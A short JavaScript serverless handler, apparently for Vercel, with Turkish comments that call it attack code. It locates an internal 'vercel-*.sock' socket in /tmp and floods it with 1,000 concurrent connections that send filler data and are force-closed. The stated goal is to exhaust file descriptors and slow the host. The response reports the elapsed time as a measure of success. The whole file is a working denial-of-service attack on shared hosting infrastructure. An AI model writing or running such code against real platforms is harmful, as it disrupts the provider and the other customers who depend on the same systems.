import fs from 'fs';
import net from 'net';

export default async function handler(req, res) {
  const tmpFiles = fs.readdirSync('/tmp');
  const socketPath = tmpFiles.find(f => f.startsWith('vercel-') && f.endsWith('.sock'));
  
  if (!socketPath) {
    return res.status(200).json({ hata: "Soket bulunamadi!" });
  }

  const fullPath = `/tmp/${socketPath}`;
  const start = Date.now();
  
  // --- SALDIRI KODU BURADA BAŞLIYOR ---
  const attack = async () => {
    const promises = [];
    for(let i = 0; i < 1000; i++) { // Sayıyı 1000'e çıkardık, baskıyı artıralım
      promises.push(new Promise((resolve) => {
        const client = net.createConnection(fullPath);
        
        // Hataları yutuyoruz ki döngü kırılmasın
        client.on('error', () => resolve()); 
        
        // Bağlanmaya çalışırken veri gönder
        client.write(JSON.stringify({ type: "ping", data: "A".repeat(100) }));
        
        // 50ms sonra zorla kapat ki kaynakları (File Descriptors) biz tüketelim
        setTimeout(() => {
          client.destroy();
          resolve();
        }, 50);
      }));
    }
    await Promise.all(promises);
  };

  await attack();
  const end = Date.now();
  // --- SALDIRI KODU BURADA BİTİYOR ---

  res.status(200).json({
    hedef: fullPath,
    aksiyon: "Socket Flooding Completed",
    gecen_sure: `${end - start}ms`,
    not: "Eğer bu süre çok uzunsa (5 saniye üstü), sistemi yavaşlatmayı başardın demektir!"
  });
}
